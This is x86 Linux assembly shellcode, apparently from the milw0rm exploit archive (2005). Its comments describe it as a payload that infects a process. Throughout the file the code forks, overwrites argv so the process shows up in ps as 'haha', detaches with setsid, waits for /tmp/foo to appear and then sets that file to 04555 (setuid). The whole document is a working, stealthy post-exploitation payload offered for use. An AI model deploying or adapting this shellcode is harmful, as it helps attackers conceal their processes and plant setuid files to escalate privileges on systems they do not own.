#=============================================================================================#
# hide-wait-change (final v4)                                                                 #
# ------------------------------------------------------------------------------------------- #
#      Author: xort (rrs@clyde.dcccd.edu)                                                     #
#        Date: 09/14/2005 3:35pm                                                              #
#        Type: shellcode/(x86-linux).s,   (at&t)                                              #
#        Size: strlen(fake-proc-name) + strlen(file-to-change) + 187                          #
# Discription: This is a shellcode that will infect a process, play some argv[0] games among  #
#              other tricks to hide itself from 'ps', and waits until the creation of a       #
#              specified file. Once this file is found to exist, its permissions are changed  #
#              to 04555. Original concept concived by izik.                                   #
###############################################################################################

.section .text

	.global _start

        ###################################################################################
        ##                                                                               ##
        ## _start: 1) fork() a new process                                               ##
        ##         2) check to see if we are child process                               ##
        ##         3) if we are then _exit()                                             ##
        ##                                                                               ##
        ###################################################################################


	_start:


	      #-------------------------------------------#
	      # we start with a fork()                    #
	      #-------------------------------------------#

	      push $0x02
              pop %eax
              int $0x80


	      #-------------------------------------------#
	      # child or parent?                          #
	      #-------------------------------------------#

	      test %eax, %eax
	      je proc_name


	      #-------------------------------------------#
	      # parent goes exit()                        #
	      #-------------------------------------------#

	      push $0x01
              pop %eax
	      int $0x80


        ###################################################################################
        ##                                                                               ##
        ##         1) get address of "/proc/self/stat" and fix null@end                  ##
        ##         2) open() "/proc/self/stat"                                           ##
        ##         3) read in 250 bytes from file                                        ##
        ##                                                                               ##
        ###################################################################################


              #-------------------------------------------#
              # grab "/proc" string location              #
              #-------------------------------------------#

 ret_w_proc:  pop %ebx
              lea 0x10(%ebx), %esi

              #-------------------------------------------#
	      # fix "/proc" string to include c-string    #
	      # terminator                                #
	      #-------------------------------------------#

              incb 0xf(%ebx)


	###################################################################################
        ##                                                                               ##
        ## Open "/proc/self/stat" and read in 250 bytes                                  ##
        ##                                                                               ##
        ###################################################################################


              #-------------------------------------------#
	      # open() the file                           #
	      #-------------------------------------------#

	      cdq
	      xor %ecx, %ecx
              movb $0x5, %al
              int $0x80


	      #------------------------------------------#
	      # read() 250-bytes from the file into      #
	      # ESP-250                                  #
	      #------------------------------------------#

	      xchg %eax, %ebx # store fd-pointer in ebx
	      push $0x3
              pop %eax
	      movb $250, %dl
	      mov %esp, %ecx
	      sub %edx, %ecx
              int $0x80

	      mov %ecx, %edi
              add %eax, %edi


	###################################################################################
        ##                                                                               ##
        ##      1) Get location of pointer to argv[0] from file (NF-13)                  ##
        ##      2) Convert it to binary                                                  ##
        ##      3) use that to find real argv[0]s location                               ##
        ##      4) null-out all args with 0x0                                            ##
        ##                                                                               ##
	###################################################################################


	      #------------------------------------------#
	      # scan for the decimal-string of the       #
	      # location of argc & argv[0]               #
	      #------------------------------------------#

	      xchg %eax, %ebx

              std
	      push $0x20
              pop %eax
	      push $14
              pop %ecx

  findargs:
              xchg %ecx, %ebx
	      repne scasb
	      xchg %ecx, %ebx
	      loop findargs
	      inc %edi
	      inc %edi


	      #------------------------------------------#
	      # translate string into a real number to   #
	      # obtain pointer.                          #
	      #------------------------------------------#

              xor %eax, %eax
	      push $10
              pop %ebx
              cld

 calcloop:
              xor %edx, %edx
              movb (%edi), %cl
              subl $0x30, %ecx
              addl %ecx, %eax
              inc %edi
              cmpb $0x20, (%edi)
              je done_gotnum
              mul %ebx
              jmp calcloop


              #------------------------------------------#
              # once we have the location in memory of   #
              # pointers to argc,argv[0-?], and envp,    #
              # extract the location of argv[0]          #
              #------------------------------------------#

 done_gotnum:
              xchg %eax, %esp
	      pop %edi
	      pop %edi
	      xchg %eax, %esp


              #------------------------------------------#
              # write 255 null characters past argv[0]   #
              # to overwrite it and any other args so ps #
              # wont see them later                      #
              #------------------------------------------#

              push %edi
              movb $0xff, %cl
              xor %eax, %eax
              rep stosb
              pop %edi



	###################################################################################
        ##                                                                               ##
        ##      1) Get location of string we are going to copy over argv[0] and fix      ##
        ##         null@end.                                                             ##
        ##      2) Call setsid() to extablish us as a process leader.                    ##
        ##      3) Jump over strings into shellcode.                                     ##
        ##                                                                               ##
	###################################################################################


              #------------------------------------------#
              # Get string location, fix nullchar and    #
              # copy over argv[0],                       #
              #------------------------------------------#


              push %esi
              dec %esi
 findend:
              inc %esi
              inc %ecx
              cmpb $0xff, (%esi)
              jne findend

              incb (%esi)
              pop %esi
	      rep movsb


              #------------------------------------------#
              # Call setsid() to establish us as a       #
              # process leader.                          #
              #------------------------------------------#

              movb $66, %al
              int $0x80

              mov %esi, %edi
              xchg %eax, %edx

              dec %eax
              mov %eax, %ecx
              repne scasb

              incb -1(%edi)


              #------------------------------------------#
              # Jump over strings into shellcode         #
              #------------------------------------------#

              jmp *%edi


	###################################################################################
        ##     STRINGS                                                                   ##
	###################################################################################


	proc_name:
		call ret_w_proc
		.ascii "/proc/self/stat\xff"

   replace_string:
		.ascii "haha\xff"

         filename:
                .ascii "/tmp/foo\xff"


	###################################################################################
        #                                                                                 #
        # SHELLCODE                                                                       #
        #          1) call nanosleep(60)                                                  #
        #          2) check to see if FILENAME exist w/ access()                          #
        #          3) if it does, then chmod 04555 FILENAME and exit                      #
        #          4) _exit()                                                             #
        #                                                                                 #
	###################################################################################

       shellcode:
                push $60

    checkforfile:
                inc %eax

              #------------------------------------------#
              # nanosleep(%edi)                          #
              #------------------------------------------#
                mov %esp, %ecx
                mov %esp, %ecx
                mov %esp, %ebx
                xorb $0xa2, %al
                int $0x80


              #------------------------------------------#
              # access((%esi),0)                         #
              #------------------------------------------#

                xor %ecx, %ecx
                mov %esi, %ebx
                xorb $0x21, %al
                int $0x80

                test %eax, %eax
                jne checkforfile


              #------------------------------------------#
              # chmod((%esi),04555)                      #
              #------------------------------------------#

                movb $0xf, %al
                movw $0x96d, %cx
                int $0x80


              #------------------------------------------#
              # _exit()                                  #
              #------------------------------------------#

                inc %eax
                int $0x80


# milw0rm.com [2005-09-09]